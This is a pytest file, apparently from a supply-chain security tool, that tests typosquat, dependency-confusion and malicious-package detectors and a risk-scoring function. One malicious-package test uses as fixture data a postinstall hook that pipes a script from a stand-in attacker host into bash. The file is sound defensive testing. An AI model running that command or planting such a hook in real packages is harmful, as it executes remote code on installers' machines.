"""Detector behaviour, driven by stubbed registry metadata.

Each test states the exact registry conditions, so the boundary between "this
is a squat" and "this is a legitimate package with a similar name" is pinned
rather than left to whatever the live registry happens to say today.
"""

from __future__ import annotations

from datetime import timedelta

import pytest

from supplyguard.core.types import (
    Finding,
    FindingCategory,
    PackageMetadata,
    ResolvedPackage,
    Severity,
)
from supplyguard.core.scoring import score_findings
from supplyguard.detectors.base import DetectorConfig
from supplyguard.detectors.dependency_confusion import DependencyConfusionDetector
from supplyguard.detectors.malicious import MaliciousPackageDetector
from supplyguard.detectors.typosquat import TyposquatDetector
from supplyguard.utils.dates import utcnow
from tests.conftest import make_context


def meta(
    name: str,
    *,
    ecosystem: str = "pypi",
    exists: bool = True,
    age_days: float = 2000,
    downloads: int | None = 5_000_000,
    repository: str | None = "https://github.com/example/example",
    readme: int = 4000,
    scripts: dict[str, str] | None = None,
    versions: dict[str, float] | None = None,
    latest: str = "9.9.9",
) -> PackageMetadata:
    """Build registry metadata with ages expressed in days-ago."""
    now = utcnow()
    published = {
        version: now - timedelta(days=days) for version, days in (versions or {}).items()
    }
    return PackageMetadata(
        ecosystem=ecosystem,
        name=name,
        exists=exists,
        latest_version=latest,
        repository_url=repository,
        first_published=now - timedelta(days=age_days),
        last_published=max(published.values()) if published else now,
        version_published=published,
        downloads_last_month=downloads,
        has_readme=readme > 0,
        readme_length=readme,
        install_scripts=scripts or {},
    )


class TestTyposquat:
    async def test_flags_a_new_low_download_lookalike(self) -> None:
        ctx = make_context(
            "pypi",
            [("reqeusts", "1.0.0")],
            metadata={"reqeusts": meta("reqeusts", age_days=5, downloads=40)},
        )
        findings = await TyposquatDetector().detect(ctx)
        assert len(findings) == 1
        assert findings[0].metadata["imitation_target"] == "requests"
        assert findings[0].severity in (Severity.CRITICAL, Severity.HIGH)

    async def test_does_not_flag_a_package_that_is_itself_popular(self) -> None:
        """The decisive guard: `preact` is one edit from `react` and legitimate."""
        ctx = make_context("npm", [("preact", "10.0.0")], metadata={})
        assert await TyposquatDetector().detect(ctx) == []

    async def test_does_not_flag_a_widely_used_similar_package(self) -> None:
        # A lookalike with real adoption is a real project, not an opportunistic squat.
        ctx = make_context(
            "pypi",
            [("reqeusts", "1.0.0")],
            metadata={"reqeusts": meta("reqeusts", age_days=3000, downloads=9_000_000)},
        )
        assert await TyposquatDetector().detect(ctx) == []

    async def test_homoglyph_names_are_flagged_regardless_of_popularity(self) -> None:
        """A non-ASCII lookalike has no innocent explanation."""
        cyrillic = "r" + "е" + "quests"  # Cyrillic 'е'
        ctx = make_context(
            "pypi",
            [(cyrillic, "1.0.0")],
            metadata={cyrillic: meta(cyrillic, age_days=4000, downloads=50_000_000)},
        )
        findings = await TyposquatDetector().detect(ctx)
        assert len(findings) == 1
        assert findings[0].severity is Severity.CRITICAL

    async def test_unresolvable_metadata_lowers_confidence_but_still_reports(self) -> None:
        # A squat that has been taken down is still in your lockfile.
        ctx = make_context("pypi", [("colourama", "0.1.2")], metadata={})
        findings = await TyposquatDetector().detect(ctx)
        assert len(findings) == 1
        assert findings[0].confidence < 0.9

    async def test_very_short_names_are_skipped(self) -> None:
        ctx = make_context("npm", [("ms2", "1.0.0")], metadata={})
        assert await TyposquatDetector().detect(ctx) == []


class TestDependencyConfusion:
    async def test_flags_a_config_mixing_public_and_private_indexes(self) -> None:
        ctx = make_context(
            "pypi",
            [("requests", "2.31.0")],
            registry_configs={
                "pip.conf": (
                    "[global]\n"
                    "index-url = https://pypi.internal.acme.com/simple\n"
                    "extra-index-url = https://pypi.org/simple\n"
                )
            },
        )
        findings = await DependencyConfusionDetector().detect(ctx)
        config_findings = [f for f in findings if "pip.conf" in (f.identifier or "")]
        assert len(config_findings) == 1
        assert config_findings[0].severity is Severity.HIGH

    async def test_private_only_config_is_not_flagged(self) -> None:
        ctx = make_context(
            "pypi",
            [("requests", "2.31.0")],
            registry_configs={
                "pip.conf": "[global]\nindex-url = https://pypi.internal.acme.com/simple\n"
            },
        )
        assert await DependencyConfusionDetector().detect(ctx) == []

    async def test_internal_name_present_publicly_is_critical(self) -> None:
        ctx = make_context(
            "pypi",
            [("acme-internal-client", "1.0.0")],
            metadata={
                "acme-internal-client": meta(
                    "acme-internal-client", versions={"1.0.0": 10}
                )
            },
        )
        findings = await DependencyConfusionDetector().detect(ctx)
        assert len(findings) == 1
        assert findings[0].severity is Severity.CRITICAL
        assert findings[0].category is FindingCategory.DEPENDENCY_CONFUSION

    async def test_internal_name_absent_publicly_is_the_safe_case(self) -> None:
        ctx = make_context("pypi", [("acme-internal-client", "1.0.0")], metadata={})
        assert await DependencyConfusionDetector().detect(ctx) == []


class TestMaliciousHeuristics:
    async def test_install_hook_piping_a_download_into_a_shell_is_reported(self) -> None:
        ctx = make_context(
            "npm",
            [("some-helper", "1.0.0")],
            metadata={
                "some-helper": meta(
                    "some-helper",
                    ecosystem="npm",
                    scripts={"postinstall": "curl -s https://evil.example/p.sh | bash"},
                )
            },
        )
        findings = await MaliciousPackageDetector()._heuristic(ctx, skip=set())
        assert len(findings) == 1
        assert findings[0].severity is Severity.HIGH

    async def test_ordinary_native_build_hook_is_not_reported(self) -> None:
        ctx = make_context(
            "npm",
            [("native-thing", "1.0.0")],
            metadata={
                "native-thing": meta(
                    "native-thing", ecosystem="npm", scripts={"install": "node-gyp rebuild"}
                )
            },
        )
        assert await MaliciousPackageDetector()._heuristic(ctx, skip=set()) == []

    async def test_established_well_documented_package_is_not_reported(self) -> None:
        ctx = make_context(
            "npm",
            [("express", "4.18.0")],
            metadata={"express": meta("express", ecosystem="npm")},
        )
        assert await MaliciousPackageDetector()._heuristic(ctx, skip=set()) == []

    async def test_weak_signals_alone_stay_below_the_threshold(self) -> None:
        """No README is not evidence of malice on its own."""
        ctx = make_context(
            "npm",
            [("small-util", "1.0.0")],
            metadata={
                "small-util": meta(
                    "small-util", ecosystem="npm", readme=0, downloads=500_000
                )
            },
        )
        assert await MaliciousPackageDetector()._heuristic(ctx, skip=set()) == []

    async def test_several_weak_signals_together_do_cross_it(self) -> None:
        ctx = make_context(
            "npm",
            [("small-util", "1.0.0")],
            metadata={
                "small-util": meta(
                    "small-util",
                    ecosystem="npm",
                    age_days=3,
                    downloads=12,
                    repository=None,
                    readme=0,
                )
            },
        )
        findings = await MaliciousPackageDetector()._heuristic(ctx, skip=set())
        assert len(findings) == 1
        assert findings[0].confidence >= 0.55

    async def test_package_missing_from_the_registry_is_a_signal(self) -> None:
        ctx = make_context("npm", [("gone-package", "1.0.0")], metadata={})
        findings = await MaliciousPackageDetector()._heuristic(ctx, skip=set())
        assert findings == [] or findings[0].confidence < 0.6


class TestScoring:
    def _finding(self, **kwargs) -> Finding:
        defaults = dict(
            category=FindingCategory.VULNERABILITY,
            severity=Severity.HIGH,
            title="t",
            description="d",
            package_name="p",
            package_version="1.0.0",
            depth=0,
            is_direct=True,
            confidence=1.0,
        )
        defaults.update(kwargs)
        return Finding(**defaults)  # type: ignore[arg-type]

    def test_clean_project_scores_zero(self) -> None:
        result = score_findings([])
        assert result.score == 0.0 and result.grade == "A"

    def test_direct_dependency_outweighs_a_deep_one(self) -> None:
        direct = score_findings([self._finding()])
        deep = score_findings([self._finding(depth=6, is_direct=False)])
        assert direct.score > deep.score

    def test_dev_only_findings_are_discounted(self) -> None:
        production = score_findings([self._finding()])
        dev = score_findings([self._finding(metadata={"is_dev": True})])
        assert dev.score < production.score

    def test_low_confidence_findings_contribute_less(self) -> None:
        certain = score_findings([self._finding()])
        unsure = score_findings([self._finding(confidence=0.3)])
        assert unsure.score < certain.score

    def test_confirmed_malicious_floors_the_score_at_failing(self) -> None:
        result = score_findings(
            [
                self._finding(
                    category=FindingCategory.MALICIOUS,
                    severity=Severity.CRITICAL,
                    confidence=1.0,
                )
            ]
        )
        assert result.grade == "F"
        assert result.floor_reason is not None

    def test_heuristic_malicious_does_not_trigger_the_floor(self) -> None:
        result = score_findings(
            [
                self._finding(
                    category=FindingCategory.MALICIOUS,
                    severity=Severity.MEDIUM,
                    confidence=0.6,
                )
            ]
        )
        assert result.floor_reason is None and result.grade != "F"

    def test_staleness_alone_does_not_fail_a_project(self) -> None:
        stale = [
            self._finding(
                category=FindingCategory.STALE, severity=Severity.LOW, package_name=f"p{i}"
            )
            for i in range(25)
        ]
        assert score_findings(stale).grade in ("A", "B")

    def test_score_is_bounded(self) -> None:
        many = [
            self._finding(severity=Severity.CRITICAL, package_name=f"p{i}") for i in range(500)
        ]
        assert 0.0 <= score_findings(many).score <= 100.0
